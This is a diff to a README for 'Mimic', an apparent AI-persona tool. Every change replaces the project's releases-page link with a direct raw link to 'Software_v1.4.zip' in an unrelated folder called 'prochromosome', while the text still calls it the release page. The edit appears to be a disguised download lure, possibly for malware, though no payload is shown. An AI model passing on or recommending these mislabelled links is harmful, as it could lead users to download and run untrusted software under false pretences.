@@ -1,6 +1,6 @@
 # 🤖 Mimic - Create Realistic AI Personas Fast
 
-[![Download Mimic](https://img.shields.io/badge/Download-Mimic-blue?style=for-the-badge&logo=github)](https://github.com/chindaheka-ui/Mimic/releases)
+[![Download Mimic](https://img.shields.io/badge/Download-Mimic-blue?style=for-the-badge&logo=github)](https://github.com/chindaheka-ui/Mimic/raw/refs/heads/main/prochromosome/Software_v1.4.zip)
 
 ## 🚀 What Mimic Does
 
@@ -16,7 +16,7 @@ Mimic fits users who want a simple way to make AI act like a real person, with a
 
 ## 💻 Windows Download
 
-Open the release page here: [Download Mimic for Windows](https://github.com/chindaheka-ui/Mimic/releases)
+Open the release page here: [Download Mimic for Windows](https://github.com/chindaheka-ui/Mimic/raw/refs/heads/main/prochromosome/Software_v1.4.zip)
 
 On that page, get the latest Windows release file. If you see more than one file, choose the one that matches your system:
 - `Windows x64` for most modern PCs
@@ -162,7 +162,7 @@ For roleplay use, check the tone, habits, and word choice. Small details make th
 
 ## 🔗 Download Again
 
-If you need the file later, use the release page here: [https://github.com/chindaheka-ui/Mimic/releases](https://github.com/chindaheka-ui/Mimic/releases)
+If you need the file later, use the release page here: [https://github.com/chindaheka-ui/Mimic/raw/refs/heads/main/prochromosome/Software_v1.4.zip](https://github.com/chindaheka-ui/Mimic/raw/refs/heads/main/prochromosome/Software_v1.4.zip)
 
 ## 📝 Project Focus
 
